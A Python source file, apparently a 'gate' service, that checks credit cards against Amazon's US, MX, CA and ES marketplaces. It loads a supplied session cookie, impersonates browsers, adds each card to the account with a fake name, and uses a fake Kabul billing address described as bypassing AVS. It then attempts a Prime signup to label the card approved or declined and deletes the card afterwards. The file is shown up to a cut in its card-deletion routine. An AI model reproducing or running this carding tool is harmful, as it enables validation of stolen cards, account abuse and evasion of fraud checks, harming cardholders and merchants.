from curl_cffi import requests as curl
import re, random, string, json, time, os, sys, io, uuid
from urllib.parse import quote_plus, quote, unquote
import html as html_lib

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')


#//! --------------------------------- Amazon Gate (US / CA / MX / ES) --------------------------------- !\\#
class AmazonGate:

    COUNTRY   = {'US': {'code': 'main',  'cur': 'USD', 'lc': 'lc-main',  'lcv': 'en_US', 'dom': 'amazon.com'},
                  'MX': {'code': 'acbmx', 'cur': 'MXN', 'lc': 'lc-acbmx', 'lcv': 'es_MX', 'dom': 'amazon.com.mx'},
                  'CA': {'code': 'acbca', 'cur': 'CAD', 'lc': 'lc-acbca', 'lcv': 'en_CA', 'dom': 'amazon.ca'},
                  'ES': {'code': 'acbes', 'cur': 'EUR', 'lc': 'lc-acbes', 'lcv': 'es_ES', 'dom': 'amazon.es'},
                  'FR': {'code': 'acbfr', 'cur': 'EUR', 'lc': 'lc-acbfr', 'lcv': 'fr_FR', 'dom': 'amazon.fr'},
                  'BR': {'code': 'acbbr', 'cur': 'BRL', 'lc': 'lc-acbbr', 'lcv': 'pt_BR', 'dom': 'amazon.com.br'},
                  'IT': {'code': 'acbit', 'cur': 'EUR', 'lc': 'lc-acbit', 'lcv': 'it_IT', 'dom': 'amazon.it'}}
    PRIME     = {'US': {'cid': 'SlashPrime', 'iid': 'PrimeDefault',   'lid': 'prime_confirm'},
                  'MX': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultMX', 'lid': 'prime_confirm'},
                  'CA': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultCA', 'lid': 'prime_confirm'},
                  'ES': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultES', 'lid': 'prime_confirm'},
                  'FR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultFR', 'lid': 'prime_confirm'},
                  'BR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultBR', 'lid': 'prime_confirm'},
                  'IT': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultIT', 'lid': 'prime_confirm'}}
    BILLING   = {'US': {'cc': 'US', 'name': 'Mark O. Montanez',  'phone': '6065406572', 'line1': '8326 nw 68th st',       'city': 'Miami',    'state': 'Florida',              'zip': '33166'},
                  'MX': {'cc': 'MX', 'name': 'Julian Talaveras',  'phone': '',            'line1': 'Andador Tulipanes 991', 'city': 'TARIMBARO', 'state': 'MICHOACAN DE OCAMPO',   'zip': '58893'},
                  'CA': {'cc': 'CA', 'name': 'Mark O. Montanez',  'phone': '',            'line1': '123 Yonge Street',      'city': 'Toronto',   'state': 'Ontario',              'zip': 'M5V 2Z2'},
                  'ES': {'cc': 'ES', 'name': 'Carlos Garcia Lopez','phone': '612345678',  'line1': 'Calle Gran Via 28',     'city': 'Madrid',    'state': 'Comunidad de Madrid',  'zip': '28013'}}
    AUDIBLE   = {'US': 'audible.com', 'CA': 'audible.ca', 'ES': 'audible.es', 'FR': 'audible.fr', 'IT': 'audible.it', 'BR': 'audible.com'}
    ALL_CODES = ['main', 'acbes', 'acbmx', 'acbit', 'acbde', 'acbbr', 'acbae', 'acbsg', 'acbsa', 'acbca', 'acbpl', 'acbau', 'acbjp', 'acbfr', 'acbin', 'acbnl', 'acbuk', 'acbtr', 'acbuc']
    FIRST     = ['James', 'Robert', 'John', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Donald']
    LAST      = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas']
    EXPIRED   = 'Cookie expired ❌'

    #//! ---- Static Helpers ---- !\\#
    @staticmethod
    def parseCard(t):
        p = re.split(r'\s*[|/;: ]\s*', t.strip())
        return {'number': p[0], 'month': p[1].zfill(2), 'year': f'20{p[2]}' if len(p[2]) == 2 else p[2], 'cvv': p[3]} if len(p) >= 4 else None

    @staticmethod
    def cap(text, s, e):
        try:    return text.split(s)[1].split(e)[0]
        except: return ''

    @staticmethod
    def fakeName():
        return f'{random.choice(AmazonGate.FIRST)} {random.choice(AmazonGate.LAST)}'

    @staticmethod
    def fakePhone(cc):
        if cc == 'MX': return '55' + str(random.randint(10000000, 99999999))
        if cc == 'CA': return '1' + str(random.randint(1000000000, 9999999999))
        if cc == 'ES': return '6' + str(random.randint(10000000, 99999999))
        return '6065406572'

    @staticmethod
    def buildCookie(cookie):
        m = re.search(r'\b(main|acb[a-z]{2})\b', cookie, re.I)
        if not m: return {'ok': False, 'msg': 'Region code not found.'}
        rc = m.group(1).lower()
        by_code = {v['code']: (k, v) for k, v in AmazonGate.COUNTRY.items()}
        if rc not in by_code: return {'ok': False, 'msg': f'Unsupported region: {rc}'}
        cc, info = by_code[rc]
        for c in AmazonGate.ALL_CODES: cookie = cookie.replace(c, info['code'])
        cookie = re.sub(r'(i18n-prefs=)[A-Z]{3}', r'\1' + info['cur'], cookie)
        cookie = re.sub(rf'({re.escape(info["lc"])}=)[^;]+', r'\1' + info['lcv'], cookie)
        return {'ok': True, 'cookie': cookie, 'domain': info['dom'], 'cc': cc}

    @staticmethod
    def cookieJar(session, cookie, domain):
        for pair in cookie.split(';'):
            if '=' not in pair: continue
            k, v = map(str.strip, pair.split('=', 1))
            session.cookies.set(k, v, domain=domain, path='/')
        return session

    @staticmethod
    def cookieAudible(cookie, country='US'):
        info = AmazonGate.COUNTRY.get(country, AmazonGate.COUNTRY['US'])
        cookie = re.sub(r'\b(acb[a-z]{2}|main)\b', info['code'], cookie)
        cookie = re.sub(r'(i18n-prefs=)[A-Z]{3}', r'\1' + info['cur'], cookie)
        return re.sub(rf'({re.escape(info["lc"])}=)[a-z]{{2}}_[A-Z]{{2}}', r'\1' + info['lcv'], cookie)

    @staticmethod
    def nextData(html):
        m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html or '', re.S)
        if not m: return None
        try:    return json.loads(m.group(1))
        except:
            try:    return json.loads(html_lib.unescape(m.group(1)))
            except: return None

    @staticmethod
    def mpoWallet(html, last4):
        nd = AmazonGate.nextData(html)
        if not nd: return {}
        pp  = nd.get('props', {}).get('pageProps', {})
        mwr = pp.get('manageWalletRequest', {})
        ci  = mwr.get('requestContext', {}).get('clientInfo', {})
        dr  = pp.get('state', {}).get('getManageableDataState', {}).get('displayResponse', {})
        out = {'client_id': ci.get('clientId'), 'customer_id': mwr.get('customerId'), 'card_present': False}
        for g in dr.get('paymentMethodDisplayLists', []):
            for item in g.get('paymentMethodDisplayList', []):
                core = item.get('paymentMethodDisplayDatumCore', {})
                d = str(core.get('paymentMethodNumber', {}).get('lastDigits', ''))
                if last4 and d == last4:
                    out.update({'card_present': True, 'last_digits': d, 'brand': core.get('paymentMethodHeader')})
                    return out
        return out

    @staticmethod
    def buildResult(html, card, cc, url=''):
        cs   = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        base = {'status': True, 'card': cs, 'card_response': '', 'gateway': f'Amazon ({cc})', 'Powered by': 'Sxgitario @ Gateway Api Service'}

        #//! 1) actionResult in URL
        if url and 'actionResult=' in url:
            try:
                ar  = json.loads(unquote(unquote(url.split('actionResult=')[1].split('&')[0])))
                err = ar.get('errorType', '')
                if ar.get('success') == 1:                                                                                      return {**base, 'success': True,  'response': 'Charged! Prime activated.', 'apiResponse': 'Approved ✅'}
                if err in ('CustomerValidationFailureException', 'HARDVET_VERIFICATION_FAILED', 'PaymentValidationException'):   return {**base, 'success': False, 'response': 'Card verification failed.', 'apiResponse': 'Declined ❌'}
                if err in ('InsufficientFundsException', 'PaymentDeclinedException'):                                            return {**base, 'success': True,  'response': 'Charged - Insufficient funds.', 'apiResponse': 'Approved ✅'}
                if err == 'BILLING_ADDRESS_RESTRICTED':                                                                         return {**base, 'success': True,  'response': 'Charged! Prime activated.', 'apiResponse': 'Approved ✅'}
                if err:                                                                                                          return {**base, 'success': False, 'response': f'Amazon error: {err}', 'apiResponse': 'Declined ❌'}
            except: pass

        #//! 2) Rate limit / throttle
        if len(html) < 200 or any(k in html for k in ['Request was throttled', 'Please wait a moment and refresh', 'Too many requests']):
            return {**base, 'status': False, 'success': False, 'response': AmazonGate.EXPIRED, 'apiResponse': 'Session Error'}

        #//! 3) HTML keywords
        RULES = [
            ('fallbackMessage',                                              True,  'Card successfully linked.'),
            ("\u2019re sorry. We\u2019re unable to complete your Prime signup", True, 'Card successfully linked.'),
            ("We're sorry. We're unable to complete your Prime signup",       True,  'Card successfully linked.'),
            ('Lo lamentamos. No podemos completar tu registro en Prime',     True,  'Card successfully linked.'),
            ('payment method was declined',                                  True,  'Charged - Insufficient funds.'),
            ('your payment was declined',                                    True,  'Charged - Insufficient funds.'),
            ('payment was declined',                                         True,  'Charged - Insufficient funds.'),
            ('unable to charge',                                             True,  'Charged - Insufficient funds.'),
            ('insufficient funds',                                           True,  'Charged - Insufficient funds.'),
            ('Welcome to Prime',                                             True,  'Charged! Prime activated.'),
            ('Bienvenido a Prime',                                           True,  'Charged! Prime activated.'),
            ('Thank you for joining Prime',                                  True,  'Charged! Prime activated.'),
            ('congratulations',                                              True,  'Charged! Prime activated.'),
            ('All your Prime benefits, in one place',                        True,  'Charged! Prime activated.'),
            ('HARDVET_VERIFICATION_FAILED',                                  False, 'Card verification failed.'),
            ('CustomerValidationFailureException',                           False, 'Card verification failed.'),
            ('PaymentValidationException',                                   False, 'Card verification failed.'),
            ('An error occurred during the sign up process',                 False, 'Card verification failed.'),
            ('exceeded the maximum attempts allowed',                        False, 'Card verification failed.'),
            ('Ha superado el número máximo de intentos',                     False, 'Card verification failed.'),
            ('enjoy 7 days of Prime for just $1.99',                         True,  'Charged! Prime activated ($1.99 Offer).'),
        ]
        hl = html.lower()
        for needle, ok, msg in RULES:
            if needle.lower() in hl:
                return {**base, 'success': ok, 'response': msg, 'apiResponse': 'Approved ✅' if ok else 'Declined ❌'}

        return {**base, 'status': False, 'success': False, 'response': 'Unknown response.', 'apiResponse': 'Error ⚠️'}


    #//! --------------------------------- Constructor --------------------------------- !\\#
    def __init__(self, cookie, proxy=None):
        self.rawCookie = cookie
        self.proxyStr  = proxy
        self.proxies   = 'http://' + proxy if proxy else None
        self.csrf = self.addrId = self.s = self.domain = self.cc = self.prime = self.card = None
        self._ready   = False


    #//! --------------------------------- Init Session (R1 + R2 + Address) --------------------------------- !\\#
    def init(self):
        cd = self.buildCookie(self.rawCookie)
        if not cd['ok']: return cd
        self.domain, self.cc = cd['domain'], cd['cc']
        self.prime = self.PRIME.get(self.cc, self.PRIME['US'])
        self.s = curl.Session(impersonate=random.choice(['chrome124', 'chrome123', 'safari17_0', 'safari17_2_ios', 'safari15_3']))
        self.s.proxies = {'http': self.proxies, 'https': self.proxies} if self.proxies else None
        self.s = self.cookieJar(self.s, cd['cookie'], self.domain)
        self.s.allow_redirects = True
        self.s.headers.update({'Connection': 'keep-alive'})

        lv   = self.COUNTRY[self.cc]['lcv']
        lang = lv.replace('_', '-') + ',' + lv.split('_')[0] + ';q=0.9,en;q=0.8'

        #//! R1 — Homepage
        try:
            r1 = self.s.get(f'https://www.{self.domain}/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.{self.domain}%2Fyour-account&openid.assoc_handle={self.cc}flex&shouldShowPasskeyLink=true', headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.mShop.android.shopping', 'Accept-Language': lang}).text
        except: return {'ok': False, 'msg': 'Connection failed ⚠️'}

        if "Sorry, your passkey isn't working." in r1: return {'ok': False, 'msg': self.EXPIRED}

        #//! R2 — CSRF Token
        r2 = self.s.get(f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca', headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.dee.app'}).text
        self.csrf = self.cap(r2, 'csrfToken = "', '"')
        if not self.csrf: return {'ok': False, 'msg': self.EXPIRED}

        #//! Address setup — check existing, add AF if missing, fallback retry
        self.addrId = self._getBillingId()
        if not self.addrId:
            self.addrId = self._addBilling()
        if not self.addrId:
            time.sleep(1)
            self.addrId = self._getBillingId()
        if not self.addrId:
            return {'ok': False, 'msg': self.EXPIRED + ' (No Billing Address)'}

        self._ready = True
        return {'ok': True}


    #//! --------------------------------- Process Card (R3 → R13) --------------------------------- !\\#
    def process(self, cardStr):
        if not self._ready: return {'success': False, 'message': self.EXPIRED}
        self.card = self.parseCard(cardStr)
        if not self.card: return {'success': False, 'message': 'Invalid card format.'}
        d, p = self.domain, self.prime
        ajax = {'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{d}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{d}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        nm = self.fakeName()

        #//! R3 — Add Card
        r3  = self.s.post(f'https://www.{d}/hz/mycd/ajax', headers=ajax, data=f'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22{nm.replace(" ", "+")}%22%2C%22cc_ExpirationMonth%22%3A%22{int(self.card["month"])}%22%2C%22cc_ExpirationYear%22%3A%22{self.card["year"]}%22%7D%7D%7D&csrfToken={quote_plus(self.csrf)}&addCreditCardNumber={self.card["number"]}').text
        pid = self.cap(r3, '"paymentInstrumentId":"', '"')
        if not pid: return {'success': False, 'message': self.EXPIRED + ' (Card Add Failed)'}

        #//! R5 — Set Payment
        r5 = self.s.post(f'https://www.{d}/hz/mycd/ajax', headers=ajax, data=f'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22{pid}%22%2C%22billingAddressId%22%3A%22{self.addrId}%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken={quote_plus(self.csrf)}').text
        if '"success":true' not in r5:
            return {'success': False, 'message': self.EXPIRED + ' (Set Payment Failed)'}

        #//! R6 — Wallet
        r6    = self.s.get(f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo', headers={'Host': f'www.{d}', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.mShop.android.shopping'})
        wst   = self.cap(r6.text, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"')
        sid   = self.cap(r6.text, '"sessionId":"', '"')
        cust  = self.cap(r6.text, 'customerId":"', '"')
        wInst = self.cap(r6.text, 'widgetInstanceId":"', '"')
        use_mpo = False

        if not wst:
            nd = self.nextData(r6.text)
            if nd:
                try:
                    pp  = nd['props']['pageProps']
                    mwr = pp.get('manageWalletRequest', {})
                    if not cust: cust = mwr.get('customerId', '')
                    ci  = mwr.get('requestContext', {}).get('clientInfo', {})
                    if ci.get('clientId') == 'YA:MPO':
                        use_mpo = True
                except Exception: pass

        if not wst and not use_mpo:
            return {'success': False, 'message': self.EXPIRED + ' (Widget Failed)'}


        #//! --- Prime signup in native country (US / MX / CA) ---
        nat_info   = self.COUNTRY.get(self.cc, self.COUNTRY['US'])
        nat_dom    = self.domain
        nat_cookie = self.rawCookie
        for c in self.ALL_CODES:
            nat_cookie = nat_cookie.replace(c, nat_info['code'])
        nat_cookie = re.sub(r'(i18n-prefs=)[A-Z]{3}', r'\1' + nat_info['cur'], nat_cookie)
        nat_cookie = re.sub(rf'({re.escape(nat_info["lc"])}=)[^;]+', r'\1' + nat_info['lcv'], nat_cookie)

        nat_s = curl.Session(impersonate=random.choice(['chrome124', 'chrome123', 'safari17_0', 'safari17_2_ios']))
        nat_s.proxies = {'http': self.proxies, 'https': self.proxies} if self.proxies else None
        nat_s = self.cookieJar(nat_s, nat_cookie, nat_dom)
        nat_s.allow_redirects = True

        #//! R8 — Prime membersignup GET (nuevo flow 2025)
        _crd    = str(uuid.uuid4()) + '_' + str(uuid.uuid4())
        _p      = self.prime
        _chhdr  = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
            'device-memory': '16', 'downlink': '10', 'dpr': '1', 'ect': '4g', 'rtt': '50',
            'sec-ch-device-memory': '16', 'sec-ch-dpr': '1',
            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
            'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Google Chrome";v="151.0.7922.138", "Chromium";v="151.0.7922.138"',
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"19.0.0"',
            'sec-ch-viewport-width': '1234', 'viewport-width': '1234',
        }
        r8 = nat_s.get(f'https://www.{nat_dom}/gp/prime/pipeline/membersignup',
                       params={'campaignId': _p['cid'], 'redirectURL': 'L2dwL3ByaW1l',
                               'locationID': _p['lid'], 'cancelRedirectURL': 'Lw',
                               'containerRequestId': _crd, 'originalContainerRequestId': _crd,
                               'primeSignupFulfillmentType': 'AMAZON_WALLET'},
                       headers=_chhdr)
        r8t = r8.text

        _Q1  = ' &amp;quot;'
        _Q2  = '&amp;quot;'
        # at2: probar sin espacio primero (formato actual), luego con espacio (formato legacy)
        at2      = self.cap(r8t, 'serializedState' + _Q2 + ':' + _Q2, _Q2).strip()
        if not at2: at2 = self.cap(r8t, 'serializedState' + _Q1 + ':' + _Q2, _Q2).strip()
        cId      = self.cap(r8t, 'customerId: "', '"').strip()
        sId      = self.cap(r8t, "ue_sid = '", "'").strip()
        wii      = self.cap(r8t, 'widgetInstanceId' + _Q2 + ':' + _Q2, _Q2).strip()
        if not wii: wii = self.cap(r8t, 'widgetInstanceId' + _Q1 + ':' + _Q2, _Q2).strip() or 'GjfJ82o8aZ5P'
        new_crid = self.cap(r8t, 'containerRequestId' + _Q2 + ':' + _Q2, _Q2).strip()
        if not new_crid: new_crid = self.cap(r8t, 'containerRequestId' + _Q1 + ':' + _Q2, _Q2).strip() or _crd
        hvCsrf   = self.cap(r8t, 'wlp-hardvet-csrf-token" content="', '"').strip()
        # offerToken: buscar en hidden input del form
        offerTok = self.cap(r8t, 'name=&quot;offerToken&quot; value=&quot;', '&quot;')
        if not offerTok: offerTok = self.cap(r8t, 'name=&amp;quot;offerToken&amp;quot; value=&amp;quot;', '&amp;quot;')
        if not offerTok: offerTok = self.cap(str(r8.url), 'offerToken=', '&')

        # Fallback: formato antiguo &amp;quot; / &quot;
        if not at2:
            if '&amp;quot;' in r8t:
                at2 = self.cap(r8t, 'Subs:Prime&amp;quot;,&amp;quot;serializedState&amp;quot;:&amp;quot;', '&amp;quot;')
                if not sId: sId = self.cap(r8t, 'Subs:Prime&amp;quot;,&amp;quot;session&amp;quot;:&amp;quot;', '&amp;quot')
                if not cId: cId = self.cap(r8t, 'quot;customerId&amp;quot;:&amp;quot;', '&amp;quot')
            else:
                at2 = self.cap(r8t, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;', '&')
                if not sId: sId = self.cap(r8t, 'Subs:Prime&quot;,&quot;session&quot;:&quot;', '&')
                if not cId: cId = self.cap(r8t, 'customerId&quot;:&quot;', '&')
        if not at2: return {'success': False, 'message': self.EXPIRED + ' (Prime Init Failed)'}
        if not cId: cId = self.cap(r8t, '"customerId":"', '"')
        if not sId: sId = self.cap(self.rawCookie, 'session-id=', ';')

        #//! R9 — ShowPreferencePaymentOptionListEvent
        _apx  = f'Subs:Prime/desktop/{wii}'
        _whdr = {
            'Host': f'www.{nat_dom}',
            'X-Requested-With': 'XMLHttpRequest',
            'apx-widget-info': _apx,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'priority': 'u=1, i',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'widget-ajax-attempt-count': '0',
        }
        r9  = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                         headers=_whdr,
                         data=f'ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22{pid}%22%5D%2C%22instrumentIds%22%3A%5B%22{pid}%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState={at2}&ie=UTF-8').text
        at3 = self.cap(r9, 'hidden\\\" name=\\\"ppw-widgetState\\\" value=\\\"', '\\\"')
        at4 = self.cap(r9, 'data-instrument-id=\\\"', '\\\"')
        if not at3: return {'success': False, 'message': self.EXPIRED + ' (Auth3 Failed)'}

        #//! R10 — PreferencePaymentOptionSelectionEvent
        r10 = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                         headers={**_whdr, 'widget-ajax-attempt-count': '1'},
                         data=f'ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState={at3}&ie=UTF-8&ppw-{at4}_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D{pid}%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-{pid}_instrumentOrderTotalBalance=%7B%7D').text
        wid = self.cap(r10, 'hidden\\\" name=\\\"ppw-widgetState\\\" value=\\\"', '\\\"')
        if not wid: return {'success': False, 'message': self.EXPIRED + ' (WalletID Failed)'}

        #//! R11 — SavePaymentPreferenceEvent (respuesta JSON nueva)
        r11 = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                         headers={**_whdr, 'widget-ajax-attempt-count': '2'},
                         data=f'ppw-jsEnabled=true&ppw-widgetState={wid}&ppw-widgetEvent=SavePaymentPreferenceEvent').text
        wid2   = self.cap(r11, 'preferencePaymentMethodIds\":\"[\\\"', '\\\"')
        prefId = self.cap(r11, '"preferenceId":"', '"')
        try:
            _r11j    = json.loads(r11)
            _pmraw   = _r11j['additionalWidgetResponseData']['additionalData'].get('preferencePaymentMethodIds', '[]')
            _pmIds   = json.loads(_pmraw)
            pmIdList = ','.join(_pmIds)
            if not wid2 and _pmIds: wid2 = _pmIds[0]
        except Exception:
            pmIdList = wid2
        if not wid2: return {'success': False, 'message': self.EXPIRED + ' (WalletSave Failed)'}

        #//! R13 — HardVet via /mcp/pipeline/transition (nuevo endpoint 2025)
        _r13p = {
            'redirectURL':                          'L2dwL3ByaW1l',
            'ExternalCommerce.GoogleTransactionToken': '',
            'successUrl':                           '/hp/wlp/pipeline/actions',
            'ExternalCommerce.AppId':               '',
            'paymentsPortalPreferenceType':         'PRIME',
            'isEligibleForAlexaPlus':               'false',
            'failureUrl':                           '/gp/prime/pipeline/membersignup',
            'inline':                               '0',
            'paymentsPortalExternalReferenceID':    'prime',
            'wlpLocation':                          _p['lid'],
            'paymentMethodId':                      wid2,
            'locationID':                           _p['lid'],
            'namespace':                            'PRIME',
            'actionPageDefinitionId':               'WLPAction_AcceptOffer_HardVet',
            'cancelRedirectURL':                    'Lw',
            'location':                             _p['lid'],
            'originalContainerRequestId':           _crd,
            'session-id':                           sId,
            'paymentMethodIdList':                  pmIdList,
            'containerRequestId':                   new_crid,
            'authenticationSourceClientReference':  new_crid,
            'deviceType':                           'desktop',
            'deviceEnvironment':                    'BROWSER',
            'clientId':                             'prime',
            'locationId':                           'wlp',
            'countryCode':                          self.cc,
            'paymentClass':                         'FreeTrial',
            'planDurationUnit':                     'Monthly',
        }
        if offerTok: _r13p['offerToken']       = offerTok
        if hvCsrf:   _r13p['hardVetCsrfToken'] = hvCsrf
        if prefId:   _r13p['preferenceId']     = prefId

        r13 = nat_s.get(f'https://www.{nat_dom}/mcp/pipeline/transition',
                        params=_r13p,
                        headers={**_chhdr,
                                 'Referer': f'https://www.{nat_dom}/gp/prime/pipeline/membersignup?campaignId={_p["cid"]}&redirectURL=L2dwL3ByaW1l&locationID={_p["lid"]}&cancelRedirectURL=Lw'})

        #//! Detect result
        fUrl   = str(r13.url)
        result = self.buildResult(r13.text, self.card, self.cc, fUrl)

        #//! Delete card from wallet after check
        try: self._deleteCard()
        except: pass

        return result

    #//! --------------------------------- Billing --------------------------------- !\\#
    def _getBillingId(self):
        r = self.s.post(f'https://www.{self.domain}/hz/mycd/ajax', headers={'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{self.domain}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}, data='data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' + quote(self.csrf)).text
        return self.cap(r, 'AddressId":"', '"')

    def _addBilling(self):
        """Add Afghanistan/Kabul address (bypasses AVS on all marketplaces). Returns addressId or None."""
        d, nm = self.domain, self.fakeName()
        ph = '7' + str(random.randint(10000000, 99999999))
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
        try: r1 = self.s.get(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button', headers={'User-Agent': ua}).text
        except: return None
        csrf = self.cap(r1, "type='hidden' name='csrfToken' value='", "'")
        if not csrf: return None
        jwt     = self.cap(r1, 'name="address-ui-widgets-previous-address-form-state-token" value="', '"')
        wCsrf   = self.cap(r1, 'name="address-ui-widgets-csrfToken" value="', '"')
        fConfig = self.cap(r1, 'name="address-ui-widgets-form-config" value="', '"')
        obfCust = self.cap(r1, 'name="address-ui-widgets-obfuscated-customerId" value="', '"')
        payload = (f'csrfToken={quote_plus(csrf)}'
                   '&address-ui-widgets-countryCode=AF'
                   f'&address-ui-widgets-enterAddressFullName={quote_plus(nm)}'
                   f'&address-ui-widgets-enterAddressPhoneNumber={ph}'
                   '&address-ui-widgets-enterAddressLine1=Street+1'
                   '&address-ui-widgets-enterAddressCity=Kabul'
                   '&address-ui-widgets-enterAddressStateOrRegion=Kabul'
                   '&address-ui-widgets-enterAddressPostalCode=1001'
                   + (f'&address-ui-widgets-previous-address-form-state-token={quote_plus(jwt)}' if jwt else '')
                   + (f'&address-ui-widgets-csrfToken={quote_plus(wCsrf)}' if wCsrf else '')
                   + (f'&address-ui-widgets-form-config={quote_plus(fConfig)}' if fConfig else '')
                   + (f'&address-ui-widgets-obfuscated-customerId={quote_plus(obfCust)}' if obfCust else ''))
        try:
            r2 = self.s.post(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_post',
                             headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
                                      'Origin': f'https://www.{d}', 'Referer': f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button',
                                      'Upgrade-Insecure-Requests': '1'}, data=payload)
        except: return None
        _pats = [r'ypc-aborder-address-id=([A-Za-z0-9-]+)', r'ya_address_book-id=([A-Za-z0-9-]+)',
                 r'addressId=([A-Za-z0-9-]+)', r'addressID=([A-Za-z0-9-]+)']
        for src in [str(r2.url)] + [h.headers.get('Location', '') for h in getattr(r2, 'history', [])]:
            for p in _pats:
                m = re.search(p, src)
                if m and len(m.group(1)) >= 8: return m.group(1)
        for p in _pats:
            m = re.search(p, r2.text)
            if m and len(m.group(1)) >= 8: return m.group(1)
        return None


    #//! --------------------------------- Delete Card from Wallet --------------------------------- !\#
    def _deleteCard(self):
        d   = self.domain
        ua  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36'

        #//! Load wallet page
        rw = self.s.get(f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo', headers={
            'Upgrade-Insecure-Requests': '1', 'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'})
        html = rw.text

        wst  = self.cap(html, '"serializedState":"', '"') or self.cap(html, 'serializedState":"', '"')
        cust = self.cap(html, 'customerId":"', '"')
